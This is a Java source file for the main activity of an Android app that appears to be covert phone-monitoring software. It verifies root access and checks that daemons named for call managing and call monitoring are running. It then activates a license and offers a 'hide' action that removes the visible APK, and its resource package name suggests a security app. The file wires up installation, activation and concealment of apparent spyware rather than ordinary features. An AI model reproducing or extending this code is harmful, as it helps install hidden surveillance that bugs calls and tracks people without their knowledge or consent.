package com.fx;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.text.Html;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.android.msecurity.R;
import com.fx.daemon.util.CrashReporter;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.pmond.ref.MonitorDaemonResource;
import com.fx.preference.PreferenceManager;
import com.fx.preference.model.ProductInfo;
import com.fx.util.FxResource;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.logger.FxLog;
import com.vvt.pm.PackageUtil;
import com.vvt.shell.ShellUtil;
import com.vvt.timer.TimerBase;
import com.vvt.util.GeneralUtil;

public class MainActivity extends Activity {
	
	private static final String TAG = "MainActivity";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	private enum UiState { UNKNOWN, VERIFY_ROOT, READY_TO_ACTIVATE, ACTIVATED };
	private UiState mCurrentUiState = UiState.UNKNOWN;
	
	private static final int DIALOG_ABOUT = 1;
	
	private Context mContext;
	private Handler mHandler;
	
	private ProgressDialog mProgressDialog;
	private TimerBase mProgressDialogTimeOut;
	
	private InstallingService mBoundInstallingService;
	private ActivationService mBoundActivationService;
	private RemoteCallingService mBoundRemoteCallingService;
	private ResetService mBoundResetService;
	
	private ServiceConnection mInstallingServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			if (LOGV) {
				FxLog.v(TAG, "onServiceConnected # ENTER ...");
			}
			mBoundInstallingService = ((InstallingService.LocalBinder) service).getService();
			mBoundInstallingService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			if (LOGV) {
				FxLog.v(TAG, "onServiceDisconnected # ENTER ...");
			}
			mBoundInstallingService = null;
		}
	};
	
	private ServiceConnection mActivationServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mBoundActivationService = ((ActivationService.LocalBinder) service).getService();
			mBoundActivationService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			mBoundActivationService = null;
		}
	};
	
	private ServiceConnection mRemoteCallingServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mBoundRemoteCallingService = ((RemoteCallingService.LocalBinder) service).getService();
			mBoundRemoteCallingService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			mBoundRemoteCallingService = null;
		}
	};
	
	private ServiceConnection mResetServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mBoundResetService = ((ResetService.LocalBinder) service).getService();
			mBoundResetService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			mBoundResetService = null;
		}
	};
	
	@Override
    public void onCreate(Bundle savedInstanceStateBundle) {
		if (LOGV) FxLog.v(TAG, "onCreate # ENTER ...[UI]");
		super.onCreate(savedInstanceStateBundle);
        mContext = this.getApplicationContext();
        mHandler = new Handler() {
        	public void handleMessage(Message msg) {
        		processMessage(msg);
        	}
        };
        Thread.setDefaultUncaughtExceptionHandler(new CrashReporter(TAG));
    }
	
	@Override
	public boolean onPrepareOptionsMenu(Menu menu) {
		menu.clear();
		
		boolean isVerifyFinished = 
				mCurrentUiState == UiState.READY_TO_ACTIVATE || 
				mCurrentUiState == UiState.ACTIVATED;
		
		if (isVerifyFinished) {
			getMenuInflater().inflate(R.menu.main_menu, menu);
		}
		else {
			getMenuInflater().inflate(R.menu.starter_menu, menu);
		}
		return true;
	}
	
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
    	switch (item.getItemId()) {
	    	case R.id.menu_main_about:
	    		showDialog(DIALOG_ABOUT);
	    		break;
	    	case R.id.menu_main_reset:
	    		actionReset(true);
	    		break;
	    	case R.id.menu_main_uninstall:
	    		actionRemoveAll();
				break;
	    	default:
	    		break;
		}
    	return true;
    }

    @Override
    protected void onStart() {
    	if (LOGV) FxLog.v(TAG, "onStart # ENTER ...[UI]");
    	super.onStart();
    	bindServices();
    	resetView();
    }
    
    @Override
    protected void onResume() {
    	if (LOGV) FxLog.v(TAG, "onResume # ENTER ...[UI]");
    	super.onResume();
    }
    
    @Override
    protected void onPause() {
    	if (LOGV) FxLog.v(TAG, "onPause # ENTER ...[UI]");
    	super.onPause();
    }
    
    
    @Override
    protected void onStop() {
    	if (LOGV) FxLog.v(TAG, "onStop # ENTER ...[UI]");
    	
    	unbindServices();
    	dismissProgressDialog();
    	
    	super.onStop();
    }
    
    @Override
	protected Dialog onCreateDialog(int id) {
		switch (id) {
			case DIALOG_ABOUT:
				View aboutView = getLayoutInflater().inflate(R.layout.about_dialog, null);
				TextView textView = (TextView) aboutView.findViewById(R.id.about_text_view);
				
				// Get product info from database
				ProductInfo productInfo = ProductInfoHelper.getProductInfo(mContext);
				
				String aboutFormat = FxResource.LANGUAGE_ABOUT_INFORMATION;
				String productId = String.valueOf(productInfo.getId());
				String version = productInfo.getVersionName();
				String buildDate = productInfo.getBuildDate();
				
				String html = String.format(aboutFormat, productId, version, buildDate);
				
				CharSequence message = Html.fromHtml(html);
				textView.setText(message);
				
				return new AlertDialog.Builder(this)
					.setTitle(R.string.language_ui_label_about)
					.setView(aboutView)
					.setPositiveButton(R.string.language_ui_label_ok, null)
					.create();
		}
		return null;
	}
    
    private void processMessage(Message msg) {
		Bundle bundle = msg.getData();
		
		int event = bundle.getInt(UiHelper.BUNDLE_KEY_EVENT);
		
		switch (event) {
			case (UiHelper.EVENT_NOTIFY):
				notifyUser(bundle.getString(UiHelper.BUNDLE_KEY_TEXT));
				break;
			case (UiHelper.EVENT_UPDATE_PROGRESS):
				setProgressDialogMessage(bundle.getString(UiHelper.BUNDLE_KEY_TEXT));
				break;
			case (UiHelper.EVENT_PROCESSING_DONE):
				dismissProgressDialog();
				break;
			case (UiHelper.EVENT_RESET_VIEW):
				resetView();
				break;
		}
	}
    
    private void verifyState() {
    	if (LOGV) FxLog.v(TAG, "verifyState # ENTER ...");
    	
    	if (mBoundInstallingService == null ||
    			mBoundActivationService == null ||
    			mBoundResetService == null ||
    			mBoundRemoteCallingService == null) {
    		
    		if (LOGV) FxLog.v(TAG, "verifyState # No bounded service -> EXIT");
    		return;
    	}
    	
    	if (mBoundInstallingService.isRunning()) {
    		if (LOGV) FxLog.v(TAG, "verifyState # Installing service is running ...");
    		actionVerifyPermission(false);
    	}
    	
    	else if (mBoundActivationService.isRunning()) {
    		if (LOGV) FxLog.v(TAG, "verifyState # Activation service is running ...");
    		actionActivate(null, false);
    	}
    	
    	else if (mBoundResetService.isRunning()) {
    		if (LOGV) FxLog.v(TAG, "verifyState # Reset service is running ...");
    		actionReset(false);
    	}
    	
    	else if (mBoundRemoteCallingService.isRunning()) {
    		if (LOGV) FxLog.v(TAG, "verifyState # RemoteCalling service is running ...");
    		waitForRemoteCallingService();
    	}
    	else {
    		if (LOGV) FxLog.v(TAG, "verifyState # No running service");
    	}
    	
    	if (LOGV) FxLog.v(TAG, "verifyState # EXIT ...");
    }
    
    private void resetView() {
    	if (LOGV) FxLog.v(TAG, "resetView # ENTER ...");
    	
    	if (LOGV) FxLog.v(TAG, String.format("resetView # Current UI state: %s", mCurrentUiState));
    	
    	UiState nextUiState = getNextUiState();
    	if (LOGV) FxLog.v(TAG, String.format("resetView # Next UI state: %s", nextUiState));
    	
    	if (nextUiState == mCurrentUiState) {
    		if (LOGV) FxLog.v(TAG, "resetView # No need to apply changes");
    	}
    	else {
    		if (LOGV) FxLog.v(TAG, "resetView # Applying changes to UI ...");
    		mCurrentUiState = nextUiState;
    		
    		if (nextUiState == UiState.READY_TO_ACTIVATE) {
        		setViewReadyToActivate();
        	}
        	else if (nextUiState == UiState.ACTIVATED) {
        		setViewActivated();
        	}
        	else {
        		setViewVerifyPermission();
        	}
    	}
    	
    	if (LOGV) FxLog.v(TAG, "resetView # EXIT ...");
    }
    
    private UiState getNextUiState() {
		if (LOGV) FxLog.v(TAG, "getNextUiState # ENTER ...");
		
		UiState nextUiState = UiState.UNKNOWN;
		
		boolean isMonitorRunning = ShellUtil.isProcessRunning(MonitorDaemonResource.PROCESS_NAME);
		boolean isCallMgrRunning = ShellUtil.isProcessRunning(BugDaemonResource.CallMgr.PROCESS_NAME);
		boolean isCallMonRunning = ShellUtil.isProcessRunning(BugDaemonResource.CallMon.PROCESS_NAME);
		boolean isMainRunning = ShellUtil.isProcessRunning(MainDaemonResource.PROCESS_NAME);
		
		boolean isDaemonRunning = isMonitorRunning && isCallMgrRunning && isCallMonRunning && isMainRunning; 
		if (LOGV) FxLog.v(TAG, String.format(
				"getNextUiState # isDaemonRunning: %s", isDaemonRunning));
		
		boolean isReadyForActivation = false;
		
		if (isDaemonRunning) {
			PreferenceManager pm = PreferenceManager.getInstance(getApplicationContext());
			ProductInfo productInfo = pm.getProductInfo();
			String urlActivation = productInfo.getUrlActivation();
			
			if (LOGV) FxLog.v(TAG, String.format(
					"getNextUiState # Activation URL: %s", urlActivation));
	
			if (urlActivation != null && urlActivation.length() > 10) {
	    		isReadyForActivation = true;
			}
		}
		
		if (isReadyForActivation) {
			boolean isActivated = LicenseManager.getInstance(mContext).isActivated();
			if (LOGV) FxLog.v(TAG, String.format(
					"getNextUiState # Is Product Activated? %s", isActivated));
			
			if (isActivated) {
				nextUiState = UiState.ACTIVATED;
			}
			else {
				nextUiState = UiState.READY_TO_ACTIVATE;
			}
		}
		else {
			if (LOGV) FxLog.v(TAG, "resetView # Preparation is incompleted");
			nextUiState = UiState.VERIFY_ROOT;
		}
		
		if (LOGV) FxLog.v(TAG, String.format("getNextUiState # Next UI state: %s", nextUiState));
		if (LOGV) FxLog.v(TAG, "getNextUiState # EXIT ...");
		
		return nextUiState;
	}

	private void setViewVerifyPermission() {
    	if (LOGV) FxLog.v(TAG, "setViewVerifyPermission # ENTER ...");
		setContentView(R.layout.check_root_permission_form);
    	
    	Button btnCheckRoot = (Button) findViewById(R.id.btn_check_root_permission);
    	btnCheckRoot.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				if (LOGV) FxLog.v(TAG, "Begin verifying permission");
				actionVerifyPermission(true);
			}
		});
    	if (LOGV) FxLog.v(TAG, "setViewVerifyPermission # EXIT ...");
    }
    
    private void setViewReadyToActivate() {
    	if (LOGV) FxLog.v(TAG, "setViewReadyToActivate # ENTER ...");
    	setContentView(R.layout.activation_form);
    	
    	TextView textInstruction = (TextView) findViewById(R.id.text_activation_instruction);
        final EditText editActivationKey = (EditText) findViewById(R.id.edit_license_activation_key);
        Button btnAction = (Button) findViewById(R.id.btn_action);
        
    	textInstruction.setText(getResources().getString(
    					R.string.language_activation_instruction_not_activated));
    	
    	btnAction.setText(getResources().getString(R.string.language_ui_label_activate));
    	btnAction.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				String activationCode = editActivationKey.getText().toString();
				if (!GeneralUtil.isNullOrEmptyString(activationCode)) {
					actionActivate(activationCode, true);
				}
			}
		});
        if (LOGV) FxLog.v(TAG, "setViewReadyToActivate # EXIT ...");
    }
    
    private void setViewActivated() {
    	if (LOGV) FxLog.v(TAG, "setViewActivated # ENTER ...");
    	setContentView(R.layout.activation_form);
    	
    	TextView textInstruction = (TextView) findViewById(R.id.text_activation_instruction);
        final EditText editActivationKey = (EditText) findViewById(R.id.edit_license_activation_key);
        Button btnAction = (Button) findViewById(R.id.btn_action);
    	
    	textInstruction.setText(getResources().getString(
    			R.string.language_activation_instruction_activated));
    	
    	editActivationKey.setVisibility(View.GONE);
    	
    	btnAction.setText(getResources().getString(R.string.language_ui_label_hide));
    	btnAction.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
	    		actionRemoveApk();
			}
		});
        if (LOGV) FxLog.v(TAG, "setViewActivated # EXIT ...");
    }
    
    private void actionVerifyPermission(boolean startService) {
    	if (LOGV) FxLog.v(TAG, "actionVerifyPermission # ENTER ...");
    	
    	showProgressDialog();
		
		// Start installing service
		if (startService) {
			if (LOGV) FxLog.v(TAG, "actionVerifyPermission # Start Installing service");
			startService(new Intent(MainActivity.this, InstallingService.class));
		}
		
		if (LOGV) FxLog.v(TAG, "actionVerifyPermission # EXIT ...");
	}
    
    private void actionReset(boolean startService) {
    	if (LOGV) FxLog.v(TAG, "actionReset # ENTER ...");
    	
    	showProgressDialog();
    	
    	if (startService) {
    		if (LOGV) FxLog.v(TAG, "actionReset # Start Reset service");
    		startService(new Intent(MainActivity.this, ResetService.class));
    	}
    	if (LOGV) FxLog.v(TAG, "actionReset # EXIT ...");
    }
    
    private void actionRemoveAll() {
		if (LOGV) FxLog.v(TAG, "actionRemoveAll # ENTER ...");
		
		// Check current state
		UiState uiState = mCurrentUiState;
    	if (uiState == UiState.UNKNOWN) {
    		uiState = getNextUiState();
    	}
    	
    	if (LOGV) FxLog.v(TAG, String.format("actionRemoveAll # uiState: %s", uiState.toString()));
    	
    	if (uiState == UiState.VERIFY_ROOT) {
    		if (LOGV) FxLog.v(TAG, "actionRemoveAll # Prompt uninstall");
    		PackageUtil.promptUninstall(mContext);
    	}
    	else {
    		if (LOGV) FxLog.v(TAG, "actionRemoveAll # Wait for remote calling service");
			waitForRemoteCallingService();
			
			if (LOGV) FxLog.v(TAG, "actionRemoveApk # Start RemoteCalling service");
			Intent uninstall = new Intent(MainActivity.this, RemoteCallingService.class);
			uninstall.setAction(RemoteCallingService.ACTION_REMOVE_ALL);
			startService(uninstall);
    	}
		if (LOGV) FxLog.v(TAG, "actionRemoveAll # EXIT ...");
	}
	
	private void actionRemoveApk() {
		if (LOGV) FxLog.v(TAG, "actionRemoveApk # ENTER ...");
		
		if (LOGV) FxLog.v(TAG, "actionRemoveAll # Wait for remote calling service");
		waitForRemoteCallingService();
		
		if (LOGV) FxLog.v(TAG, "actionRemoveApk # Start RemoteCalling service");
		Intent uninstall = new Intent(MainActivity.this, RemoteCallingService.class);
		uninstall.setAction(RemoteCallingService.ACTION_REMOVE_APK);
		startService(uninstall);
		
		if (LOGV) FxLog.v(TAG, "actionRemoveApk # EXIT ...");
	}

	/**
	 * RemoteCallingService is one way communication for hiding or uninstalling application. 
	 * Once it is finished, the APK will be removed. 
	 */
	private void waitForRemoteCallingService() {
		showProgressDialog();
	}

	private void actionActivate(String activationCode, boolean startService) {
		if (LOGV) FxLog.v(TAG, "actionActivate # ENTER ...");
		
		showProgressDialog();
		
		if (LOGV) FxLog.v(TAG, "actionActivate # Wait for activation result ...");
		
		if (startService) {
			if (LOGV) FxLog.v(TAG, "actionActivate # Start activation service");
			Intent intent = new Intent(MainActivity.this, ActivationService.class);
			intent.putExtra(ActivationService.EXTRA_ACTIVATION_CODE, activationCode);
			
			startService(intent);
		}
		
		if (LOGV) FxLog.v(TAG, "actionActivate # EXIT ...");
	}

	private void notifyUser(String stringMessage) {
    	Toast.makeText(this, stringMessage, Toast.LENGTH_LONG).show();
    }
    
    private void showProgressDialog() {
    	if (LOGV) {
    		FxLog.v(TAG, "showProgressDialog # ENTER ...");
    	}
    	
    	if (mProgressDialog == null) {
	    	mProgressDialog = ProgressDialog.show(MainActivity.this, "", 
	    			FxResource.LANGUAGE_UI_MSG_PROCESSING_POLITE, true);
	    	
	    	resetProgressDialogTimeout();
    	}
    }
    
    private void resetProgressDialogTimeout() {
    	if (mProgressDialogTimeOut != null) {
    		mProgressDialogTimeOut.stop();
    		mProgressDialogTimeOut = null;
    	}
    	
    	mProgressDialogTimeOut = new TimerBase() {
			
			@Override
			public void onTimer() {
				if (LOGV) {
					FxLog.v(TAG, "resetProgressDialogTimeout.onTimer # ENTER ...");
				}
				dismissProgressDialog();
				
				// Cannot do toast inside Thread that has not called Looper.prepare()
				Bundle data = new Bundle();
				data.putInt(
						UiHelper.BUNDLE_KEY_EVENT, 
						UiHelper.EVENT_NOTIFY);
				
				data.putString(
						UiHelper.BUNDLE_KEY_TEXT, 
						FxResource.LANGUAGE_PROCESS_NOT_RESPONDING);
				
				Message msg = new Message();
				msg.setData(data);
				
				mHandler.sendMessage(msg);
			}
		};
		
		mProgressDialogTimeOut.setTimerDurationMs(
				UiHelper.PROGRESS_DIALOG_TIMEOUT_LONG_MS);
		
		mProgressDialogTimeOut.start();
    }
    
    private void setProgressDialogMessage(String message) {
    	if (mProgressDialog != null) {
			mProgressDialog.setMessage(message);
		}
    	resetProgressDialogTimeout();
    }
    
    private void dismissProgressDialog() {
    	if (LOGV) FxLog.v(TAG, "dismissProgressDialog # ENTER ...");
    	
    	Thread t = new Thread() {
    		@Override
    		public void run() {
    			SystemClock.sleep(500);
    			
    			if (mProgressDialog != null) {
    				mProgressDialog.dismiss();
    				mProgressDialog = null;
    			}
    			
    			// Cancel timeout timer
    			if (mProgressDialogTimeOut != null) {
    				mProgressDialogTimeOut.stop();
    				mProgressDialogTimeOut = null;
    			}
    		}
    	};
    	t.start();
    }
    
    private void bindServices() {
    	if (mBoundInstallingService == null) {
	    	bindService(new Intent(MainActivity.this, InstallingService.class), 
	    			mInstallingServiceConn, BIND_AUTO_CREATE);
    	}
    	
    	if (mBoundActivationService == null) {
    		bindService(new Intent(MainActivity.this, ActivationService.class),
    				mActivationServiceConn, BIND_AUTO_CREATE);
    	}
    	
    	if (mBoundRemoteCallingService == null) {
	    	bindService(new Intent(MainActivity.this, RemoteCallingService.class), 
	    			mRemoteCallingServiceConn, BIND_AUTO_CREATE);
    	}
    	
    	if (mBoundResetService == null) {
	    	bindService(new Intent(MainActivity.this, ResetService.class), 
	    			mResetServiceConn, BIND_AUTO_CREATE);
    	}
    }
    
    private void unbindServices() {
    	if (mBoundInstallingService != null) {
    		unbindService(mInstallingServiceConn);
    		mBoundInstallingService = null;
    	}
    	
    	if (mBoundActivationService != null) {
	    	unbindService(mActivationServiceConn);
	    	mBoundActivationService = null;
    	}
    	
    	if (mBoundRemoteCallingService != null) {
	    	unbindService(mRemoteCallingServiceConn);
	    	mBoundRemoteCallingService = null;
    	}
    	
    	if (mBoundResetService != null) {
	    	unbindService(mResetServiceConn);
	    	mBoundResetService = null;
    	}
    }
}


